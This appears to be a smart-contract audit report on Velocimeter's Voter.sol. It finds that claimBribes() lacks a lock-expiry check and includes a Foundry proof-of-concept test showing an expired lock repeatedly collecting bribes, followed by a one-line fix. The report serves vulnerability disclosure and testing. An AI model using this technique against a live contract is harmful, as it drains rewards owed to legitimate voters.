Wonderful Coconut Corgi

High

# Users can claim bribe rewards for expired locks

## Summary
There is a lack of an expiry check in the claimBribes() function of voter.sol, which allows users with expired locks to claim bribes. 

## Vulnerability Detail

The `claimBribes()` function in `voter.sol` is intended to distribute bribe rewards to users who participate in the voting process. When a user calls this function, it allows them to claim the rewards for a given token ID and associated bribe contract.
However, the function fails to check whether the lock associated with the token ID has expired before allowing the user to claim rewards. Ideally, only users with active locks should be eligible to claim bribes. The absence of this check means that users can continue to collect bribes even after their locks have expired.

**Note:** It is not simply that the voter is receiving rewards for the last epoch where they were active (which would be acceptable); rather, they are able to claim rewards indefinitely for all upcoming epochs, despite their lock being expired.

Please check POC for more detail.

## Impact
- This vulnerability allows users with expired locks to unfairly claim rewards, reducing the amount available for legitimate users and effectively stealing from them.

## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/63818925987a5115a80eff4bd12578146a844cfd/v4-contracts/contracts/Voter.sol#L542-L547

## POC 

- Place below test in `minter.t.sol` file of the test suite and run it via command : "forge test --mt testBribesOnExpiredLock -vvv"

```solidity

function testBribesOnExpiredLocks() public {
        deployBase();

        //creating lock for only one week
        FLOW.transfer(address(minter), TOKEN_100K);
        flowDaiPair.approve(address(escrow), TOKEN_1);
        uint tokenId = escrow.create_lock(TOKEN_1,1 weeks); //lock for only 1 week
        minter.startActivePeriod();
        vm.roll(block.number + 1);

        //creating gauge
        voter.createGauge(address(pair), 0);
        address gaugeAddress = voter.gauges(address(pair));

        //creating Bribe 
        address[] memory rewards = new address[](2);
        rewards[0] = address(USDC);
        rewards[1] = address(FRAX);
        ExternalBribe newExternalBribe = new ExternalBribe(address(voter), rewards);
        voter.setExternalBribeFor(gaugeAddress, address(newExternalBribe));

        //Users votes 
        address[] memory pools = new address[](1);
        pools[0] = address(pair);
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;
        voter.vote(tokenId, pools, weights);

        //Rewards are distributed
        voter.distribute();

        //Burning Contracts USDC Balance for clean accounting
        USDC.transfer(address(0),USDC.balanceOf(address(this)));
        console2.log("Voter initial USDC Balance  : ", USDC.balanceOf(address(this)));

        //Donor donates the bribe to bribe contract.
        address donor = address(0x123);
        deal(address(USDC), donor, 4e6);

        vm.startPrank(donor);
        USDC.approve(address(newExternalBribe), 1e6);
        newExternalBribe.notifyRewardAmount(address(USDC), 1e6);
        vm.stopPrank();

        //1 week passes
        //2nd epoch begind
        _elapseOneWeek();

        //At this point voters lock is expired
        //assertEq(escrow.locked__end(tokenId) < uint(block.timestamp), true, "lock is should be expired");

        //Voter calls claimBribes after the lock has been expired
        address[] memory bribes = new address[](1);
        bribes[0] = address(newExternalBribe);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](2);
        tokens[0][0] =  address(USDC);
        tokens[0][1] =  address(FRAX);
        voter.claimBribes(bribes,tokens,tokenId);

        //Here users is receiving the rewards for the first epoch, which is fine given the design choice.
        assertGt(USDC.balanceOf(address(this)),0);
        console2.log("Voter USDC Balance : ", USDC.balanceOf(address(this)));

        //Rewards are distributed
        voter.distribute();

        vm.startPrank(donor);
        USDC.approve(address(newExternalBribe), 1e6);
        newExternalBribe.notifyRewardAmount(address(USDC), 1e6);
        vm.stopPrank();

        //2 week passes
        //3rd epoch begind
        _elapseOneWeek();

        //voters lock is still expired
        assertEq(escrow.locked__end(tokenId) < uint(block.timestamp), true, "lock is should be expired");

        voter.claimBribes(bribes,tokens,tokenId);

        //ideally, voter should not receive any bribes as the lock is expired and was expired for the last epoch as well.
        console2.log("Voter USDC Balance : ", USDC.balanceOf(address(this)));

        //3rd week passes
        //4th epoch begind
        _elapseOneWeek();

        voter.distribute();

        vm.startPrank(donor);
        USDC.approve(address(newExternalBribe), 1e6);
        newExternalBribe.notifyRewardAmount(address(USDC), 1e6);
        vm.stopPrank();

        _elapseOneWeek();

        voter.claimBribes(bribes,tokens,tokenId);

        //Voter is still recieving the rewards
        console2.log("Voter USDC Balance : ", USDC.balanceOf(address(this)));

        //4th week passes
        //5th epoch begind
        _elapseOneWeek();

        voter.distribute();

        vm.startPrank(donor);
        USDC.approve(address(newExternalBribe), 1e6);
        newExternalBribe.notifyRewardAmount(address(USDC), 1e6);
        vm.stopPrank();

        _elapseOneWeek();

        voter.claimBribes(bribes,tokens,tokenId);

        //Voter is still recieving the rewards
        console2.log("Voter USDC Balance : ", USDC.balanceOf(address(this)));

    }

```
## Tool used
Manual Review

## Recommendation

- Add a check to ensure the token lock has not expired before allowing users to claim bribes.
- Note, 1 week (epoch duration) is added allow users to claim the rewards for the last week.

```diff
function claimBribes(address[] memory _bribes, address[][] memory _tokens, uint _tokenId) external {
+++  require(IVotingEscrow(_ve).locked(_tokenId).end + 1 weeks >= block.timestamp, "Expired token");
     require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId)); 
     for (uint i = 0; i < _bribes.length; i++) { 
         IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]); 
     } 
 }
```